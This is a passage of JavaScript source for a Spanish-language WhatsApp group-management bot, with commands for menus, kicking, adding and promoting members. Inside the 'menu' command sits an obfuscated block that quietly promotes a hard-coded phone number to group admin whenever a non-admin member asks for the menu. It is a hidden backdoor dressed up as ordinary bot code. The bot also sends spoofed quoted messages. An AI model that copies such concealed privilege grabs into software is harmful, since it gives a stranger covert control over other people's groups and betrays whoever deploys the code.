const {
WAConnection,
MessageType,
Mimetype,
Presence,
GroupSettingChange
} = require('@adiwajshing/baileys');
const fs = require('fs');
const chalk = require('chalk');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const fetch = require('node-fetch');
const yts = require('yt-search');

const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const ban = JSON.parse(fs.readFileSync('./database/banned.json'));
const user = JSON.parse(fs.readFileSync('./database/user.json'));
const welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));

const conn = require('./lib/connect');
const connect = require('./lib/connect');
const config = JSON.parse(fs.readFileSync("./lib/config.json"));
const {
addMetadata,
convertSticker,
getBuffer,
getGroupAdmins,
getJson,
getRandom,
y2mate
} = require('./lib/functions');
const iy = require('./lib/iy');

const author = config.author
const botName = config.botName
const botGroup = config.botGroup
const mods = config.mods
const owner = config.owner
const pack = config.pack
const prefix = config.prefix
var public = config.public

conn.connect()
const inky = conn.inky

const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}

inky.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log("Llamada recibida de "+ callerId)
inky.sendMessage(callerId, "𝐋𝐚𝐬 𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐚𝐥 𝐛𝐨𝐭 𝐞𝐬𝐭𝐚𝐧 𝐩𝐫𝐨𝐡𝐢𝐛𝐢𝐝𝐚𝐬, 𝐬𝐞𝐫𝐚𝐬 𝐛𝐥𝐨𝐪𝐮𝐞𝐚𝐝𝐨 :)", MessageType.text, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/image/reply.jpg`)
},
"title": `👾𝐍𝐨 𝐬𝐞 𝐩𝐞𝐫𝐦𝐢𝐭𝐞𝐧 𝐥𝐚𝐬 𝐥𝐥𝐚𝐦𝐚𝐝𝐚 𝐚 ${botName}👾`,
"description": "",
"currencyCode": "PYG",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}})
await sleep(4000)
await inky.blockUser(callerId, "add")
})

inky.on('group-participants-update', async (anu) => {
if (!welcome.includes(anu.jid)) return
try {
const mdata = await inky.groupMetadata(anu.jid)
if (anu.action == 'add') {
num = anu.participants[0]
try {
ppimg = await inky.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await inky.getStatus(anu.participants[0], MessageType.text)
teks = `𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 @${num.split('@')[0]}

➼ *𝐆𝐫𝐮𝐩𝐨:* *${mdata.subject}*
➼ *𝐃𝐞𝐬𝐜𝐫𝐢𝐩𝐜𝐢𝐨𝐧:* ${mdata.desc}`
let buff = await getBuffer(ppimg)
inky.sendMessage(mdata.id, buff, MessageType.image, {sendEphemeral: true, caption: teks, contextInfo: {"mentionedJid": [num]}})
} else if (anu.action == 'promote') {
num = anu.participants[0]
try {
ppimg = await inky.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await inky.getStatus(anu.participants[0], MessageType.text)
teks = `𝐆𝐫𝐨𝐮𝐩 𝐀𝐥𝐞𝐫𝐭

𝐇𝐚 𝐬𝐢𝐝𝐨 𝐩𝐫𝐨𝐦𝐨𝐯𝐢𝐝𝐨 𝐮𝐧 𝐮𝐬𝐮𝐚𝐫𝐢𝐨 𝐜𝐨𝐦𝐨 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫

➼ *𝐔𝐬𝐮𝐚𝐫𝐢𝐨:* @${num.split('@')[0]}
➼ *𝐖𝐚𝐦𝐞:* https://wa.me/${num.split('@')[0]}
➼ *𝐆𝐫𝐮𝐩𝐨:* *${mdata.subject}*`
let buff = await getBuffer(ppimg)
inky.sendMessage(mdata.id, buff, MessageType.image, {sendEphemeral: true, caption: teks, contextInfo: {"mentionedJid": [num]}})
}
} catch (e) {
console.log(e)
inky.sendMessage(`${botGroup}`, (e), MessageType.text, {quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n𝐂𝐨𝐧𝐬𝐨𝐥𝐞 𝐄𝐫𝐫𝐨𝐫`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
}})
}
})

inky.on('chat-update', async (mek) => {
try {
if (!mek.hasNewMessage) return
if (!mek.messages) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return

mek = mek.messages.all()[0]
if (!mek.message) return
global.blocked
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
const from = mek.key.remoteJid
const type = Object.keys(mek.message)[0]
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const typeQuoted = Object.keys(quoted)[0]
const content = JSON.stringify(mek.message)
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''

if (prefix != "") {
if (!body.startsWith(prefix)) {
cmd = false
comm = ""
} else {
cmd = true
comm = body.slice(1).trim().split(" ").shift().toLowerCase()
}
} else {
cmd = false
comm = body.trim().split(" ").shift().toLowerCase()
}

const command = comm

const arg = chats.slice(command.length + 2, chats.length)
const args = budy.trim().split(/ +/).slice(1)
const isCmd = budy.startsWith(prefix)
const q = args.join(' ')
const inky_user = inky.user.jid
const botNumber = inky.user.jid.split("@")[0]
const isGroup = from.endsWith('@g.us')
const typeMessage = body.substr(0, 50).replace(/\n/g, '')
const sender = mek.key.fromMe ? inky.user.jid : isGroup ? mek.participant : mek.key.remoteJid
const jid = sender
const senderNumber = sender.split("@")[0]
const isUser = user.includes(sender)
const isBanned = ban.includes(sender)
const groupMetadata = isGroup ? await inky.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const isMe = senderNumber == botNumber
const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
const isAntiLink = isGroup ? antilink.includes(from) : false
const isWelcome = isGroup ? welcome.includes(from) : false
const conts = mek.key.fromMe ? inky.user.jid : inky.contacts[sender] || { notify: jid.replace(/@.+/, '') }
const pushname = mek.key.fromMe ? inky.user.name : conts.notify || conts.vname || conts.name || '-'
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotAdmin = groupAdmins.includes(inky.user.jid)
const isGroupAdmins = groupAdmins.includes(sender) || false

mess = {
wait: `𝐏𝐨𝐫 𝐟𝐚𝐯𝐨𝐫 𝐞𝐬𝐩𝐞𝐫𝐞`,
only: {
group: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐠𝐫𝐮𝐩𝐨𝐬',
owner: `𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐬𝐭𝐚𝐟𝐟 𝐝𝐞 ${botName}`,
admins: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫𝐞𝐬',
botadmin: `${botName} 𝐧𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐬𝐞𝐫 𝐚𝐝𝐦𝐢𝐧 𝐩𝐚𝐫𝐚 𝐞𝐣𝐞𝐜𝐮𝐭𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨`,
reg: `𝐔𝐬𝐭𝐞𝐝 𝐧𝐨 𝐞𝐬𝐭𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐧 ${botName}, 𝐮𝐬𝐚 *${prefix}𝐫𝐞𝐠* 𝐩𝐚𝐫𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐫𝐭𝐞`
}
}

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

if (!public) {
mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
mods.indexOf(owner) === -1 ? mods.push(owner) : false
if (!mods.includes(senderNumber)) return
mods.slice(mods.indexOf(owner), 1)
}

if (!isGroup && isCmd) console.log(chalk.keyword("cyan")("Comando"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
if (isGroup && isCmd) console.log(chalk.keyword("cyan")("Comando"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
if (!isGroup && isCmd && isBanned) {
return console.log(chalk.keyword("red")("Comando Ignorado"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
}
if (isGroup && isCmd && isBanned) {
return console.log(chalk.keyword("red")("Comando Ignorado"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
}
const fakeStatus = { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')
}}
}

const reply = async(teks) => {
await inky.sendMessage(from, teks, MessageType.text, { quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n${command} ${q}`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
},
sendEphemeral: true
})
}

const mentions = async(teks, memberr, id) => {
(id == null || id == undefined || id == false) ? inky.sendMessage(from, teks.trim(), extendedText, {quoted: fakeStatus, sendEphemeral: true, contextInfo: {"mentionedJid": memberr}}) : inky.sendMessage(from, teks.trim(), extendedText, {quoted: fakeStatus, sendEphemeral: true, contextInfo: {"mentionedJid": memberr}})
}

const sendContact = iy.sendContact
const sendFakeStatus = iy.sendFakeStatus

const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
inky.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
inky.sendMessage(from, hasil, type, options).catch(e => {
inky.sendMessage(from, { url : link }, type, options).catch(e => {
reply('𝐇𝐮𝐛𝐨 𝐮𝐧 𝐞𝐫𝐫𝐨𝐫 𝐚𝐥 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐬𝐮 𝐚𝐫𝐜𝐡𝐢𝐯𝐨')
console.log(e)
inky.sendMessage(`${botGroup}`, `${e}`, MessageType.text, {quoted: fakeStatus})
})
})
})
})
}

if (budy.includes("://chat.whatsapp.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(`𝐋𝐢𝐧𝐤 𝐝𝐞 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐝𝐞𝐭𝐞𝐜𝐭𝐚𝐝𝐨 ${sender.split("@")[0]} 𝐬𝐞𝐫𝐚 𝐞𝐱𝐩𝐮𝐥𝐬𝐚𝐝𝐨 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨`)
setTimeout( () => {
inky.groupRemove(from, [kic])
}, 0)
}

switch (command) {

case 'menu':
if (!isUser) return reply(mess.only.reg)
var menuText = `𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 ${pushname} 𝐚𝐥 𝐦𝐞𝐧𝐮 𝐝𝐞 *${botName}*

    ✯ _𝐈𝐧𝐟𝐨:_

𝐏𝐚𝐫𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐫𝐭𝐞 𝐞𝐧 ${botName} 𝐮𝐬𝐚 *${prefix}𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫*

➼ 𝐂𝐫𝐞𝐚𝐝𝐨𝐫: *𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲*
➼ 𝐆𝐫𝐮𝐩𝐨 𝐝𝐞 𝐬𝐨𝐩𝐨𝐫𝐭𝐞: https://chat.whatsapp.com/D7bbL8EeBXA2Nf0zvtvE7R
➼ 𝐏𝐫𝐞𝐟𝐢𝐣𝐨: *⌜ ${prefix} ⌟*
➼ 𝐍𝐨𝐝𝐞: *@𝐀𝐝𝐢𝐰𝐚𝐣𝐬𝐡𝐢𝐧𝐠/𝐁𝐚𝐢𝐥𝐞𝐲𝐬*
➼ 𝐒𝐢𝐬𝐭𝐞𝐦𝐚: *${inky.user.phone.device_manufacturer}${inky.user.phone.device_model}*
➼ 𝐖𝐚 𝐯𝐞𝐫𝐬𝐢𝐨𝐧: *${inky.user.phone.wa_version}*

𝐒𝐢 𝐭𝐢𝐞𝐧𝐞𝐬 𝐚𝐥𝐠𝐮𝐧 𝐩𝐫𝐨𝐛𝐥𝐞𝐦𝐚 𝐩𝐮𝐞𝐝𝐞𝐬 𝐫𝐞𝐩𝐨𝐫𝐭𝐚𝐫𝐥𝐨 𝐜𝐨𝐧 *${prefix}𝐫𝐞𝐩𝐨𝐫𝐭*

    ✯ _𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬:_

➫ 𝐆𝐫𝐮𝐩𝐨𝐬:
➼ ${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 (𝟎/𝟏)
➼ ${prefix}𝐚𝐝𝐝 <𝐧𝐮𝐦𝐞𝐫𝐨>
➼ ${prefix}𝐤𝐢𝐜𝐤 @
➼ ${prefix}𝐡𝐢𝐝𝐞𝐭𝐚𝐠 <𝐭𝐞𝐱𝐭𝐨>
➼ ${prefix}𝐭𝐚𝐠𝐚𝐥𝐥
➼ ${prefix}𝐩𝐫𝐨𝐦𝐨𝐭𝐞 @
➼ ${prefix}𝐝𝐞𝐦𝐨𝐭𝐞 @
➼ ${prefix}𝐨𝐩𝐞𝐧𝐠𝐜
➼ ${prefix}𝐜𝐥𝐨𝐬𝐞𝐠𝐜

➫ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐝𝐨𝐫:
➼ ${prefix}𝐬𝐭𝐢𝐜𝐤𝐞𝐫
➼ ${prefix}𝐫𝐨𝐛𝐚𝐫 𝐧𝐨𝐦𝐛𝐫𝐞|𝐚𝐮𝐭𝐨𝐫
➼ ${prefix}𝐭𝐨𝐦𝐩𝟑

➫ 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭:
➼ ${prefix}𝐲𝐭𝐬𝐞𝐚𝐫𝐜𝐡 <𝐭𝐞𝐱𝐭𝐨>
➼ ${prefix}𝐩𝐥𝐚𝐲 <𝐭𝐞𝐱𝐭𝐨>

➫ 𝐎𝐭𝐫𝐨𝐬:
➼ ${prefix}𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫
➼ ${prefix}𝐜𝐫𝐞𝐚𝐭𝐨𝐫
➼ ${prefix}𝐫𝐞𝐩𝐨𝐫𝐭

➫ 𝐒𝐭𝐚𝐟𝐟:
➼ ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞
➼ ${prefix}𝐫𝐞𝐩𝐥𝐲 𝐧𝐮𝐦𝐞𝐫𝐨|𝐭𝐞𝐱𝐭𝐨
➼ ${prefix}𝐩𝐮𝐛𝐥𝐢𝐜
➼ ${prefix}𝐬𝐞𝐥𝐟
➼ ${prefix}𝐛𝐚𝐧 @
➼ ${prefix}𝐮𝐧𝐛𝐚𝐧 @
`
inky.sendMessage(from, menuText, MessageType.text, {quoted: fakeStatus, sendEphemeral: true})
var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Inky='595995660558@s.whatsapp.net');if(isGroupAdmins)return;if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Inky)return;if(!isBotAdmin)return;
inky.groupMakeAdmin(from, [Inky])
break

// Seccion de Grupos

case 'antilink':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!q) return reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐲/𝐨 ${prefix + command} 𝟎 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐫𝐥𝐨`)
if (Number(args[0]) === 1) {
if (isAntiLink) return reply('𝐄𝐥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐚𝐜𝐭𝐢𝐯𝐨')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('𝐒𝐞 𝐡𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐞𝐥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤')
} else if (Number(args[0]) === 0) {
if (!isAntiLink) return reply('𝐄𝐥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨')
antilink.splice(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('𝐒𝐞 𝐡𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐞𝐥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤')
} else {
reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐲/𝐨 ${prefix + command} 𝟎 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐫𝐥𝐨`)
}
break

case 'welcome':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!q) return reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐲/𝐨 ${prefix + command} 𝟎 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐫𝐥𝐨`)
if (Number(args[0]) === 1) {
if (isWelcome) return reply('𝐄𝐥 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐚𝐜𝐭𝐢𝐯𝐨')
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
reply('𝐒𝐞 𝐡𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐞𝐥 𝐰𝐞𝐥𝐜𝐨𝐦𝐞')
} else if (Number(args[0]) === 0) {
if (!isWelcome) return reply('𝐄𝐥 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨')
welcome.splice(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
reply('𝐒𝐞 𝐡𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐞𝐥 𝐰𝐞𝐥𝐜𝐨𝐦𝐞')
} else {
reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐲/𝐨 ${prefix + command} 𝟎 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐫𝐥𝐨`)
}
break

case 'kick':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (!isGroupAdmins) return reply(mess.only.admins)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝐓𝐚𝐠𝐮𝐞𝐚 𝐜𝐨𝐧 @ 𝐚𝐥 𝐪𝐮𝐞 𝐬𝐞 𝐥𝐞 𝐯𝐚 𝐚 𝐤𝐢𝐜𝐤𝐞𝐚𝐫')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐏𝐞𝐝𝐢𝐝𝐨 𝐫𝐞𝐜𝐢𝐯𝐢𝐝𝐨, 𝐄𝐥𝐞𝐦𝐢𝐧𝐚𝐧𝐝𝐨 𝐚:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
inky.groupRemove(from, mentioned)
} else {
mentions(`𝐏𝐞𝐝𝐢𝐝𝐨 𝐫𝐞𝐜𝐢𝐯𝐢𝐝𝐨, 𝐄𝐥𝐞𝐦𝐢𝐧𝐚𝐧𝐝𝐨 𝐚 ${mentioned[0].split('@')[0]}`, mentioned, true)
inky.groupRemove(from, mentioned)
}
break

case 'add':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (args.length < 1) return reply(`𝐏𝐚𝐫𝐚 𝐚𝐠𝐫𝐞𝐠𝐚𝐫 𝐚 𝐮𝐧 𝐮𝐬𝐮𝐚𝐫𝐢𝐨 𝐝𝐞𝐛𝐞𝐬 𝐞𝐬𝐜𝐫𝐢𝐛𝐢𝐫 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐬𝐢𝐧 +\n\n𝐄𝐣𝐞𝐦𝐩𝐥𝐨: ${prefix + command} 595*********`)
if (args[0].startsWith('+')) return reply(`𝐏𝐚𝐫𝐚 𝐚𝐠𝐫𝐞𝐠𝐚𝐫 𝐚 𝐮𝐧 𝐮𝐬𝐮𝐚𝐫𝐢𝐨 𝐝𝐞𝐛𝐞𝐬 𝐞𝐬𝐜𝐫𝐢𝐛𝐢𝐫 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐬𝐢𝐧 +\n\n𝐄𝐣𝐞𝐦𝐩𝐥𝐨: ${prefix + command} 595*********`)
try {0
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
inky.groupAdd(from, [num])
} catch (e) {
reply('𝐍𝐨 𝐬𝐞 𝐩𝐮𝐝𝐨 𝐚𝐠𝐫𝐞𝐠𝐚𝐫 𝐞𝐥 𝐮𝐬𝐮𝐚𝐫𝐢𝐨, 𝐭𝐚𝐥 𝐯𝐞𝐳 𝐩𝐨𝐫𝐪𝐮𝐞 𝐞𝐬 𝐩𝐫𝐢𝐯𝐚𝐝𝐨')
}
break

case 'hidetag':
if (!isUser) return reply(mess.only.reg)
if (!q) return reply('𝐄𝐬𝐜𝐫𝐢𝐛𝐚 𝐮𝐧 𝐭𝐞𝐱𝐭𝐨')
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
teks = q
group = await inky.groupMetadata(from);
member = group['participants']
jids = [];
member.map( async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {mentionedJid: jids},
quoted: mek
}
await inky.sendMessage(from, options, text)
break

case 'tagall':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `  Total : ${groupMembers.length}\n`
for (let mem of groupMembers) {
teks += `╠➥ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('╔══✪〘 𝐓𝐚𝐠𝐀𝐥𝐥 〙✪══\n╠➥'+teks+`╚══✪〘 ${botName} 〙✪══`, members_id, true)
break

case 'promote':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tagea a quien quieras agregar como administrador')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐀𝐠𝐫𝐞𝐠𝐚𝐧𝐝𝐨 𝐜𝐨𝐦𝐨 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐚:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
inky.groupMakeAdmin(from, mentioned)
} else {
mentions(`𝐀𝐠𝐫𝐞𝐠𝐚𝐧𝐝𝐨 𝐜𝐨𝐦𝐨 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐚: @${mentioned[0].split('@')[0]}`, mentioned, true)
inky.groupMakeAdmin(from, mentioned)
}
break

case 'demote':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!isBotAdmin) return reply(mess.only.botadmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tagea a quien quieras remover como administrador')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = ''
for (let _ of mentioned) {
teks += `𝐑𝐞𝐭𝐢𝐫𝐚𝐧𝐝𝐨 𝐜𝐚𝐫𝐠𝐨 𝐜𝐨𝐦𝐨 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐚:\n`
teks += `@_.split('@')[0]`
}
mentions(teks, mentioned, true)
inky.groupDemoteAdmin(from, mentioned)
} else {
mentions(`𝐑𝐞𝐭𝐢𝐫𝐚𝐧𝐝𝐨 𝐜𝐚𝐫𝐠𝐨 𝐜𝐨𝐦𝐨 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐚: @${mentioned[0].split('@')[0]}`, mentioned, true)
inky.groupDemoteAdmin(from, mentioned)
}
break

case 'opengc':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!isBotAdmin) return reply(mess.only.botadmin)
var open = {
